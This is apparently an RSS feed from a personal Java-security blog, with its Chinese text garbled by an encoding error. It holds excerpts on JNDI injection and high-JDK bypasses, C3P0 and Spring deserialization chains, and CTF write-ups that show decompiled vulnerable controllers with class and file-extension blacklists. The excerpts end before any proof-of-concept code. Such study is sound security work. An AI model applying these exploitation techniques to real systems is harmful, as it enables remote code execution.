<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/categories/javasec/</link><description>baozongwi's blog</description><lastBuildDate>Fri, 20 Feb 2026 20:57:03 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/categories/javasec/" rel="self" type="application/rss+xml"/><item><title>JNDI æ³¨å…¥ç»•è¿‡é«˜ç‰ˆæœ¬ JDK é™åˆ¶</title><link>https://baozongwi.xyz/p/jndi-injection-bypass-high-version-jdk/</link><guid>https://baozongwi.xyz/p/jndi-injection-bypass-high-version-jdk/</guid><pubDate>Mon, 09 Feb 2026 22:03:34 +0800</pubDate><description>å‰é¢å­¦ä¹  JNDI æ³¨å…¥çš„æ—¶å€™å°±æœ‰é˜…è¯»è¿‡æºç ï¼Œä¸»è¦æœ‰ä¸¤ç§æ‰‹æ®µï¼Œä¸€ç§æ˜¯é€šè¿‡ååºåˆ—åŒ–ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨æœ¬åœ°çš„å·¥å‚ç±»ï¼Œç¯å¢ƒç›´æ¥æŠŠ 8u66 æ¢æˆ jdk8u202 å°±è¡Œäº†
åœ¨com/sun/jndi/cosnaming/CNCtx.classä¸­å¯ä»¥æ‰¾åˆ°è¿™æ®µä»£ç 
1 2 3 4 5 static { PrivilegedAction var0 = () -&amp;amp;gt; System.getProperty(&amp;amp;#34;com.sun.jndi.cosnaming.object.trustURLCodebase&amp;amp;#34;, &amp;amp;#34;false&amp;amp;#34;); String var1 = (String)AccessController.doPrivileged(var0); trustURLCodebase = &amp;amp;#34;true&amp;amp;#34;.equalsIgnoreCase(var1); } é»˜è®¤å°† trustURLCodebase è¿™ä¸ªå±æ€§è®¾ç½®ä¸º falseï¼Œé™¤éç³»ç»Ÿè®¾ç½®ä¸º true æ‰ä¼šè®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆå¦‚ä½•ç»•è¿‡å‘¢ï¼Œå‰é¢æˆ‘ä»¬å­¦ä¹ åˆ°è¿‡ç›¸å…³çŸ¥è¯†ï¼Œåœ¨com.sun.jndi.ldap.Obj.decodeObject
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 static Object decodeObject(Attributes var0) throws NamingException { String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4])); try { Attribute var1; if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) { ClassLoader var3 = helper.getURLClassLoader(var2); return deserializeObject((byte[])var1.get(), var3); } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) { return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2); } else { var1 = var0.get(JAVA_ATTRIBUTES[0]); return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;amp;amp;&amp;amp;amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2); } } catch (IOException var5) { NamingException var4 = new NamingException(); var4.setRootCause(var5); throw var4; } } //static final String[] JAVA_ATTRIBUTES = new String[]{&amp;amp;#34;objectClass&amp;amp;#34;, &amp;amp;#34;javaSerializedData&amp;amp;#34;, &amp;amp;#34;javaClassName&amp;amp;#34;, &amp;amp;#34;javaFactory&amp;amp;#34;, &amp;amp;#34;javaCodeBase&amp;amp;#34;, &amp;amp;#34;javaReferenceAddress&amp;amp;#34;, &amp;amp;#34;javaClassNames&amp;amp;#34;, &amp;amp;#34;javaRemoteLocation&amp;amp;#34;}; æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥æ˜¯èƒ½å¤Ÿé€šè¿‡ javaSerializedDataï¼Œä¹Ÿå°±æ˜¯LDAPä¸­æœ‰åºåˆ—åŒ–æ•°æ®ï¼Œç›´æ¥ååºåˆ—åŒ–æ”»å‡»æœ¬åœ°çš„ vul gadgetï¼Œè¿˜æœ‰ä¸€ç§ä¾ç„¶æ˜¯æˆ‘ä»¬çš„ Reference å¯¹è±¡å¼•ç”¨ï¼Œè¿™é‡Œè·Ÿè¿›ä¸‹ decodeReference çœ‹ä¸‹å…·ä½“å®ç°</description><content:encoded>å‰é¢å­¦ä¹  JNDI æ³¨å…¥çš„æ—¶å€™å°±æœ‰é˜…è¯»è¿‡æºç ï¼Œä¸»è¦æœ‰ä¸¤ç§æ‰‹æ®µï¼Œä¸€ç§æ˜¯é€šè¿‡ååºåˆ—åŒ–ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨æœ¬åœ°çš„å·¥å‚ç±»ï¼Œç¯å¢ƒç›´æ¥æŠŠ 8u66 æ¢æˆ jdk8u202 å°±è¡Œäº†
åœ¨com/sun/jndi/cosnaming/CNCtx.classä¸­å¯ä»¥æ‰¾åˆ°è¿™æ®µä»£ç 
1 2 3 4 5 static { â€¦</content:encoded></item><item><title>JNDIæ³¨å…¥</title><link>https://baozongwi.xyz/p/jndi-injection/</link><guid>https://baozongwi.xyz/p/jndi-injection/</guid><pubDate>Tue, 30 Dec 2025 22:07:18 +0800</pubDate><description>äº†è§£ JNDI (Java Naming and Directory Interface) æ³¨å…¥çš„æ ¸å¿ƒåŸç†åœ¨äº Java å…è®¸é€šè¿‡ JNDI æ¥å£åŠ¨æ€åŠ è½½å¤–éƒ¨èµ„æºï¼ˆå¯¹è±¡ï¼‰ã€‚
å½“æ”»å‡»è€…å¯ä»¥æ§åˆ¶ JNDI lookup å‡½æ•°çš„å‚æ•°ï¼ˆURIï¼‰æ—¶ï¼Œä»–ä»¬å¯ä»¥å°†å…¶æŒ‡å‘ä¸€ä¸ªæ¶æ„çš„ RMI æˆ– LDAP æœåŠ¡ã€‚å¦‚æœè¢«æ”»å‡»çš„å®¢æˆ·ç«¯é…ç½®å…è®¸åŠ è½½è¿œç¨‹ codebaseï¼ŒJNDI ä¼šè‡ªåŠ¨ä¸‹è½½å¹¶å®ä¾‹åŒ–æ”»å‡»è€…æŒ‡å®šçš„æ¶æ„ç±»ï¼Œä»è€Œè§¦å‘ä»£ç æ‰§è¡Œã€‚
JNDI æ³¨å…¥åˆ©ç”¨äº† Java çš„ Naming Referencesï¼ˆå‘½åå¼•ç”¨ï¼‰ æœºåˆ¶ã€‚
**æ­£å¸¸æƒ…å†µï¼š**lookup è·å–çš„æ˜¯ç»‘å®šåœ¨æ³¨å†Œè¡¨ä¸­çš„ç°æœ‰å¯¹è±¡ã€‚ æ³¨å…¥æƒ…å†µï¼š æ”»å‡»è€…åœ¨æ¶æ„çš„ RMI/LDAP æ³¨å†Œè¡¨ä¸­ç»‘å®šä¸€ä¸ª Reference å¯¹è±¡ï¼ˆè€Œä¸æ˜¯ç›´æ¥çš„å¯¹è±¡å®ä¾‹ï¼‰ã€‚è¿™ä¸ª Reference å¯¹è±¡åŒ…å«äº†ä¸‰ä¸ªå…³é”®ä¿¡æ¯ï¼š ClassName: ç›®æ ‡ç±»çš„åç§°ï¼ˆæ¶æ„ç±»åï¼‰ã€‚ Factory: ç”¨äºåˆ›å»ºè¯¥ç±»å®ä¾‹çš„å·¥å‚ç±»åç§°ã€‚ FactoryLocation: è¯¥å·¥å‚ç±»æ‰€åœ¨çš„ URL åœ°å€ï¼ˆæ”»å‡»è€…çš„ HTTP æœåŠ¡å™¨ï¼‰ã€‚ å½“å—å®³è€…çš„ JNDI å®¢æˆ·ç«¯æ”¶åˆ°è¿™ä¸ª Reference åï¼Œå®ƒå‘ç°æœ¬åœ°æ²¡æœ‰è¿™ä¸ªç±»ï¼Œäºæ˜¯å°±ä¼šå»FactoryLocationæŒ‡å‘çš„åœ°å€ä¸‹è½½.classæ–‡ä»¶å¹¶åŠ è½½è¿è¡Œã€‚
åŒæ—¶ JNDI æ³¨å…¥å¯¹ç‰ˆæœ¬æœ‰é™åˆ¶
åè®® JDK6 JDK7 JDK8 JDK11 LADP 6u211ä»¥ä¸‹ 7u201ä»¥ä¸‹ 8u191ä»¥ä¸‹ 11.0.1ä»¥ä¸‹ RMI 6u132ä»¥ä¸‹ 7u122ä»¥ä¸‹ 8u113ä»¥ä¸‹ æ—  ä½ç‰ˆæœ¬ JDKï¼šå®¢æˆ·ç«¯å‘ç°æœ¬åœ°æ²¡æœ‰è¯¥ Factory ç±»ï¼Œä¼šå» classFactoryLocation æŒ‡å®šçš„åœ°å€ä¸‹è½½ .class å­—èŠ‚ç å¹¶å®ä¾‹åŒ–ã€‚æ¶æ„ä»£ç é€šå¸¸éšè—åœ¨ Factory ç±»çš„ static {} é™æ€ä»£ç å—æˆ–æ„é€ å‡½æ•°ä¸­ï¼Œåœ¨å®ä¾‹åŒ–æ—¶è§¦å‘ RCEã€‚ é«˜ç‰ˆæœ¬ JDK (8u191+)ï¼šç”±äº trustURLCodebase é»˜è®¤ä¸º falseï¼Œè¿œç¨‹ä¸‹è½½è¢«ç¦æ­¢ã€‚æ­¤æ—¶æ”»å‡»è€…é€šå¸¸è½¬å‘åˆ©ç”¨æœ¬åœ° ClassPath ä¸­å·²å­˜åœ¨çš„ Factory ç±»ï¼ˆå¦‚ Tomcat BeanFactoryï¼‰æˆ–åˆ©ç”¨ LDAP è¿”å›åºåˆ—åŒ–æ•°æ®æ¥æ”»å‡»æœ¬åœ°èµ„æºçš„ gadgetï¼ˆldapMAPï¼‰ JNDIæ³¨å…¥æµç¨‹ ldap å†™ä¸ªå° demo</description><content:encoded>äº†è§£ JNDI (Java Naming and Directory Interface) æ³¨å…¥çš„æ ¸å¿ƒåŸç†åœ¨äº Java å…è®¸é€šè¿‡ JNDI æ¥å£åŠ¨æ€åŠ è½½å¤–éƒ¨èµ„æºï¼ˆå¯¹è±¡ï¼‰ã€‚
å½“æ”»å‡»è€…å¯ä»¥æ§åˆ¶ JNDI lookup å‡½æ•°çš„å‚æ•°ï¼ˆURIï¼‰æ—¶ï¼Œä»–ä»¬å¯ä»¥å°†å…¶æŒ‡å‘ä¸€ä¸ªæ¶æ„çš„ RMI æˆ– LDAP æœåŠ¡ã€‚å¦‚æœ â€¦</content:encoded></item><item><title>Tabby å®‰è£… &amp; åŸºç¡€ä½¿ç”¨</title><link>https://baozongwi.xyz/p/tabby-setup-and-basics/</link><guid>https://baozongwi.xyz/p/tabby-setup-and-basics/</guid><pubDate>Mon, 22 Dec 2025 22:58:40 +0800</pubDate><description>Tabby å®‰è£… https://github.com/tabby-sec/tabbyæ³¨æ„ï¼šæœ€æ–°ç‰ˆæœ¬éœ€è¦è¿è¡Œåœ¨ JDK 17 ç¯å¢ƒä¸‹
neo4j 1 2 3 4 5 6 7 8 9 10 https://dist.neo4j.org/neo4j-community-5.26.0-unix.tar.gz tar -xf neo4j-community-5.26.0-unix.tar.gz mv neo4j-community-5.26.0 ~/Downloads/Tools/neo4j-v5 cd ~/Downloads/Tools/neo4j-v5 jenv local 17.0.5 ./bin/neo4j --version ç„¶åç™»å½•neo4j\neo4jä¿®æ”¹å¯†ç ä¸ºBaozongwi123!
æ’ä»¶å®‰è£… apoc æ’ä»¶
Neo4j v5 ç‰ˆæœ¬ apoc æ’ä»¶æ”¹æˆäº†ä¸¤ä¸ªéƒ¨åˆ† apoc-core å’Œ apoc-extendï¼Œå¯è‡ªè¡Œåœ¨ä»¥ä¸‹ä¸¤ä¸ªåº“ä¸‹è½½
1 2 https://github.com/neo4j/apoc/releases/download/5.26.0/apoc-5.26.0-core.jar https://github.com/neo4j-contrib/neo4j-apoc-procedures/releases/download/5.26.0/apoc-5.26.0-extended.jar å…³äº apoc æ’ä»¶çš„ç‰ˆæœ¬é€‰æ‹©æ–¹æ³•ï¼ŒNeo4j æ•°æ®åº“ç‰ˆæœ¬çš„å‰ä¸¤ä½å¯¹åº” apoc æ’ä»¶çš„ç‰ˆæœ¬ï¼Œæ¯”å¦‚ Neo4j æ•°æ®åº“ç‰ˆæœ¬ä¸º v5.3.0ï¼Œåˆ™é€‰æ‹© apoc æ’ä»¶ v5.3.x ç‰ˆæœ¬</description><content:encoded>Tabby å®‰è£… https://github.com/tabby-sec/tabbyæ³¨æ„ï¼šæœ€æ–°ç‰ˆæœ¬éœ€è¦è¿è¡Œåœ¨ JDK 17 ç¯å¢ƒä¸‹
neo4j 1 2 3 4 5 6 7 8 9 10 â€¦</content:encoded></item><item><title>HITCTF2025 EzLoader</title><link>https://baozongwi.xyz/p/hitctf-2025-ezloader/</link><guid>https://baozongwi.xyz/p/hitctf-2025-ezloader/</guid><pubDate>Fri, 19 Dec 2025 21:00:47 +0800</pubDate><description>æ§åˆ¶å™¨å°±ä¸€ä¸ªååºåˆ—åŒ–æ¥å£
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.hitctf.util; import java.io.IOException; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class SecureObjectInputStream extends ObjectInputStream { static String[] blacklist = new String[]{&amp;amp;#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&amp;amp;#34;, &amp;amp;#34;com.fasterxml.jackson.databind.node.POJONode&amp;amp;#34;, &amp;amp;#34;javax.management.BadAttributeValueExpException&amp;amp;#34;, &amp;amp;#34;javax.swing.event.EventListenerList&amp;amp;#34;, &amp;amp;#34;java.security.SignedObject&amp;amp;#34;}; public SecureObjectInputStream(InputStream in) throws IOException { super(in); } protected Class&amp;amp;lt;?&amp;amp;gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); for(String black : blacklist) { if (name.equals(black)) { System.out.println(&amp;amp;#34;Invalid:&amp;amp;#34; + desc.getName()); throw new ClassNotFoundException(desc.getName()); } } return super.resolveClass(desc); } } è¿‡æ»¤äº†å¸¸ç”¨ååºåˆ—åŒ–ç±»ï¼Œspring ä¾èµ–ï¼Œæ‰“æœ€æ–°çš„é‚£æ¡åˆ©ç”¨é“¾ï¼Œ</description><content:encoded>æ§åˆ¶å™¨å°±ä¸€ä¸ªååºåˆ—åŒ–æ¥å£
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // // Source code recreated from a .class file by â€¦</content:encoded></item><item><title>D3CTF2025 D3jtar</title><link>https://baozongwi.xyz/p/d3ctf-2025-d3jtar/</link><guid>https://baozongwi.xyz/p/d3ctf-2025-d3jtar/</guid><pubDate>Thu, 18 Dec 2025 22:55:03 +0800</pubDate><description>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œä¸æ¶‰åŠååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œä¸€ä¸ª Jtar çš„è§£æé—®é¢˜
1 2 3 4 5 git clone https://github.com/5i1encee/D3CTF2025-d3jtar.git wget -O jdk-8u202-linux-x64.tar.gz https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz docker build -t d3jtar_image . docker run -d -p 8080:8080 --name d3jtar d3jtar_image å¯åŠ¨å®¹å™¨ä¹‹åï¼Œè§£å‹ tar åŒ…å¼€å§‹åˆ†æï¼Œçœ‹ä¸‹æ§åˆ¶å™¨
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package d3.example.controller; import d3.example.utils.BackUp; import d3.example.utils.Upload; import java.io.File; import java.io.IOException; import java.nio.file.Paths; import java.util.Arrays; import java.util.HashSet; import java.util.Objects; import java.util.Set; import javax.servlet.http.HttpServletRequest; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.servlet.ModelAndView; @Controller public class MainController { @GetMapping({&amp;amp;#34;/view&amp;amp;#34;}) public ModelAndView view(@RequestParam String page, HttpServletRequest request) { if (page.matches(&amp;amp;#34;^[a-zA-Z0-9-]+$&amp;amp;#34;)) { String viewPath = &amp;amp;#34;/WEB-INF/views/&amp;amp;#34; + page + &amp;amp;#34;.jsp&amp;amp;#34;; String realPath = request.getServletContext().getRealPath(viewPath); File jspFile = new File(realPath); if (realPath != null &amp;amp;amp;&amp;amp;amp; jspFile.exists()) { return new ModelAndView(page); } } ModelAndView mav = new ModelAndView(&amp;amp;#34;Error&amp;amp;#34;); mav.addObject(&amp;amp;#34;message&amp;amp;#34;, &amp;amp;#34;The file don&amp;amp;#39;t exist.&amp;amp;#34;); return mav; } @PostMapping({&amp;amp;#34;/Upload&amp;amp;#34;}) @ResponseBody public String UploadController(@RequestParam MultipartFile file) { try { String uploadDir = &amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;; Set&amp;amp;lt;String&amp;amp;gt; blackList = new HashSet(Arrays.asList(&amp;amp;#34;jsp&amp;amp;#34;, &amp;amp;#34;jspx&amp;amp;#34;, &amp;amp;#34;jspf&amp;amp;#34;, &amp;amp;#34;jspa&amp;amp;#34;, &amp;amp;#34;jsw&amp;amp;#34;, &amp;amp;#34;jsv&amp;amp;#34;, &amp;amp;#34;jtml&amp;amp;#34;, &amp;amp;#34;jhtml&amp;amp;#34;, &amp;amp;#34;sh&amp;amp;#34;, &amp;amp;#34;xml&amp;amp;#34;, &amp;amp;#34;war&amp;amp;#34;, &amp;amp;#34;jar&amp;amp;#34;)); String filePath = Upload.secureUpload(file, uploadDir, blackList); return &amp;amp;#34;Upload Success: &amp;amp;#34; + filePath; } catch (Upload.UploadException e) { return &amp;amp;#34;The file is forbidden: &amp;amp;#34; + e; } } @PostMapping({&amp;amp;#34;/BackUp&amp;amp;#34;}) @ResponseBody public String BackUpController(@RequestParam String op) { if (Objects.equals(op, &amp;amp;#34;tar&amp;amp;#34;)) { try { BackUp.tarDirectory(Paths.get(&amp;amp;#34;backup.tar&amp;amp;#34;), Paths.get(&amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;)); return &amp;amp;#34;Success !&amp;amp;#34;; } catch (IOException var3) { return &amp;amp;#34;Failure : tar Error&amp;amp;#34;; } } else if (Objects.equals(op, &amp;amp;#34;untar&amp;amp;#34;)) { try { BackUp.untar(Paths.get(&amp;amp;#34;webapps/ROOT/WEB-INF/views&amp;amp;#34;), Paths.get(&amp;amp;#34;backup.tar&amp;amp;#34;)); return &amp;amp;#34;Success !&amp;amp;#34;; } catch (IOException var4) { return &amp;amp;#34;Failure : untar Error&amp;amp;#34;; } } else { return &amp;amp;#34;Failure : option Error&amp;amp;#34;; } } } ä¸‰ä¸ªè·¯ç”±ï¼Œview è§£æ jspï¼ŒUpload ä¸Šä¼ æ–‡ä»¶ä½†æ˜¯æœ‰é»‘åå•ï¼ŒBackUp æ‰“åŒ… tar å’Œè§£åŒ… tarï¼Œçœ‹ä¸‹å…·ä½“å®ç°</description><content:encoded>è¿™æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ç›®ï¼Œä¸æ¶‰åŠååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œä¸€ä¸ª Jtar çš„è§£æé—®é¢˜
1 2 3 4 5 git clone https://github.com/5i1encee/D3CTF2025-d3jtar.git wget -O jdk-8u202-linux-x64.tar.gz â€¦</content:encoded></item><item><title>C3P0ååºåˆ—åŒ–</title><link>https://baozongwi.xyz/p/c3p0-deserialization/</link><guid>https://baozongwi.xyz/p/c3p0-deserialization/</guid><pubDate>Tue, 16 Dec 2025 00:19:47 +0800</pubDate><description>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚
å…³äº JDBC å’Œ C3P0 çš„å…³ç³»ï¼ŒJDBC å°±åƒæ˜¯ Java ä¸–ç•Œé‡Œçš„â€œäº¤é€šæ³•è§„â€ï¼Œå®ƒè§„å®šäº†ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´è¯¥æ€ä¹ˆäº¤æµã€‚ä½†æ˜¯ï¼Œå…‰æœ‰æ³•è§„è¿˜ä¸è¡Œï¼Œè¿˜å¾—æœ‰äººæ¥å…·ä½“æ‰§è¡Œå’Œç®¡ç†ã€‚C3P0 å°±æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„â€œè½¦è¾†è°ƒåº¦ä¸­å¿ƒâ€ï¼Œå®ƒå®Œå…¨éµå®ˆ JDBC è¿™å¥—æ³•è§„ï¼Œä¸“é—¨è´Ÿè´£å¸®æˆ‘ä»¬é«˜æ•ˆåœ°ç®¡ç†æ•°æ®åº“è¿æ¥ï¼Œè™½ç„¶å®ƒä¸æ˜¯ Java è‡ªå¸¦çš„ï¼Œä½†å®ƒæ˜¯åœ¨å¸® JDBC æŠŠå·¥ä½œåšå¾—æ›´å¥½ã€‚
å…³äºâ€œè¿æ¥æ± â€æ˜¯ä»€ä¹ˆï¼Œè¿æ¥æ± çš„æ¦‚å¿µå…¶å®ç‰¹åˆ«åƒå’±ä»¬éª‘çš„â€œå…±äº«å•è½¦â€ã€‚ä½ å¯ä»¥è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰è¿æ¥æ± ï¼Œæ¯æ¬¡ä½ çš„ç¨‹åºè¦è¯»å†™æ•°æ®åº“ï¼Œéƒ½å¾—ç°åœºâ€œé€ â€ä¸€è¾†è‡ªè¡Œè½¦ï¼ˆå»ºç«‹è¿æ¥ï¼‰ï¼Œéª‘å®Œäº†ä¸€æ¬¡è¿˜å¾—é©¬ä¸ŠæŠŠå®ƒâ€œæ‹†â€äº†ï¼ˆé”€æ¯è¿æ¥ï¼‰ã€‚è¿™ä¸€é€ ä¸€æ‹†ï¼Œæ—¢è´¹æ—¶é—´åˆè´¹åŠ›æ°”ï¼Œæ•ˆç‡ç‰¹åˆ«ä½ã€‚
ä¸ºä»€ä¹ˆè¦ç”¨å®ƒï¼Œæœ‰äº† C3P0 è¿™ç§è¿æ¥æ± ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚å®ƒä¼šæå‰é€ å¥½å‡ åè¾†è½¦åœåœ¨è·¯è¾¹ï¼ˆæ± å­é‡Œï¼‰ã€‚å½“ç¨‹åºéœ€è¦æ“ä½œæ•°æ®åº“æ—¶ï¼Œç›´æ¥ä»æ± å­é‡Œâ€œé¢†â€ä¸€è¾†è½¦éª‘èµ°å°±è¡Œï¼›ç­‰äº‹æƒ…åŠå®Œäº†ï¼Œå†æŠŠè½¦è¿˜å›æ± å­é‡Œï¼Œç•™ç€ç»™ä¸‹ä¸€æ¬¡æˆ–è€…åˆ«äººç”¨ã€‚è¿™æ ·åå¤åˆ©ç”¨ï¼Œçœå»äº†é¢‘ç¹åˆ›å»ºå’Œé”€æ¯è¿æ¥çš„å¼€é”€ï¼Œç³»ç»Ÿçš„ååº”é€Ÿåº¦è‡ªç„¶å°±å˜å¿«äº†ã€‚
é‚£ä¹ˆï¼Œå¦‚æœé‚£å‡ åè¾†â€œå…±äº«å•è½¦â€ï¼ˆè¿æ¥ï¼‰éƒ½è¢«éª‘èµ°äº†ï¼Œè¿™æ—¶å€™åˆæ¥äº†æ–°çš„ç”¨æˆ·æƒ³è¦ç”¨è½¦ï¼Œä½ è§‰å¾— C3P0 ä¼šæ€ä¹ˆå¤„ç†è¿™äº›æ–°æ¥çš„è¯·æ±‚å‘¢ï¼Ÿ
æƒ³è±¡ä¸€ä¸‹ï¼Œè·¯è¾¹çš„ç«™ç‚¹åªæœ‰ 10 è¾†è½¦ï¼Œç»“æœå…¨éƒ½è¢«äººéª‘èµ°äº†ï¼ˆè¿æ¥æ± ç©ºäº†ï¼‰ã€‚è¿™ä¸ªæ—¶å€™ä¼šæ€ä¹ˆåšï¼Ÿ
å½“æ‰€æœ‰è¿æ¥éƒ½åœ¨å¿™çš„æ—¶å€™ï¼Œæ–°æ¥çš„è¯·æ±‚ä¸ä¼šé©¬ä¸Šè¢«æ‹’ç»ï¼Œè€Œæ˜¯ä¼šæ’é˜Ÿç­‰å¾…ï¼ˆé˜»å¡ï¼‰ï¼Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œä¸€æ—¦æœ‰åˆ«çš„çº¿ç¨‹ç”¨å®ŒæŠŠè¿æ¥â€œè¿˜â€å›æ¥ï¼ŒC3P0 å°±ä¼šç«‹é©¬æŠŠè¿™ä¸ªè¿æ¥åˆ†é…ç»™æ­£åœ¨æ’é˜Ÿçš„äººï¼Œä½†æ˜¯è¿™ä¸ªé˜»å¡æ˜¯æœ‰åº•çº¿çš„ã€‚
åœ¨ C3P0 ä¸­ï¼Œè¿™ä¸ªâ€œåº•çº¿â€æœ‰ä¸€ä¸ªä¸“é—¨çš„æœ¯è¯­ï¼Œå«åš Checkout Timeoutï¼Œå¹¶æŠ›å‡ºå¼‚å¸¸ğŸ¥¸
å¯¹äº C3P0 å°±äº†è§£åˆ°è¿™é‡Œï¼Œå…·ä½“å‚è§ æºç è¯¦è§£ç³»åˆ—(äº”) &amp;amp;mdash;&amp;amp;mdash; C3P0çš„ä½¿ç”¨å’Œåˆ†æï¼ˆåŒ…æ‹¬JNDIï¼‰ å·²åœæ›´ - å­æœˆç”Ÿ - åšå®¢å›­
ä½¿ç”¨ jdk8u66 ä¾èµ–å¦‚ä¸‹
1 2 3 4 5 &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;com.mchange&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;c3p0&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;0.9.5.2&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; C3P0å¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰å¦‚ä¸‹ä¸‰ç§
URLClassLoaderè¿œç¨‹ç±»åŠ è½½ JNDIæ³¨å…¥ åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡» URLClassLoaderè¿œç¨‹ç±»åŠ è½½ æˆ‘ä»¬çŸ¥é“æœ‰è¿™ç§åŠ è½½æ–¹å¼</description><content:encoded>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚
å…³äº JDBC å’Œ C3P0 çš„å…³ç³»ï¼ŒJDBC å°±åƒæ˜¯ Java ä¸–ç•Œé‡Œçš„â€œäº¤é€šæ³•è§„â€ï¼Œå®ƒè§„å®šäº†ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´è¯¥æ€ä¹ˆäº¤æµã€‚ä½†æ˜¯ï¼Œå…‰æœ‰æ³•è§„è¿˜ä¸è¡Œï¼Œè¿˜å¾—æœ‰äººæ¥å…·ä½“æ‰§è¡Œå’Œç®¡ â€¦</content:encoded></item><item><title>Spring åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨é“¾</title><link>https://baozongwi.xyz/p/spring-native-deserialization-chains/</link><guid>https://baozongwi.xyz/p/spring-native-deserialization-chains/</guid><pubDate>Wed, 10 Dec 2025 22:50:56 +0800</pubDate><description>ä½ç‰ˆæœ¬çš„æˆ‘ä¹Ÿä¸æ‡‚ï¼Œæˆ‘åªçŸ¥é“é«˜ç‰ˆæœ¬çš„ã€‚
é«˜ç‰ˆæœ¬ BadAttributeValueExpException ä¸èƒ½è§¦å‘ toString äº†ï¼Œå¯»æ‰¾ä¸€ä¸ªæ›¿æ¢çš„ç±»ï¼Œä¹‹å‰å­¦åˆ°è¿‡åœ¨EventListenerList#readObjectä¸­æœ‰ä¸€ä¸ª add æ–¹æ³•ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶ç›‘å¬ç±»ï¼Œå¯ä»¥è§¦å‘ toString æ–¹æ³•
åé¢å°±æ˜¯ Jackson é“¾ï¼ŒåŠ ä¸Šé«˜ç‰ˆæœ¬ jdk åå°„ï¼ŒTemplatesImpl éœ€è¦ä½¿ç”¨ jdk åŠ¨æ€ä»£ç†ã€‚
1 --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED poc å¦‚ä¸‹
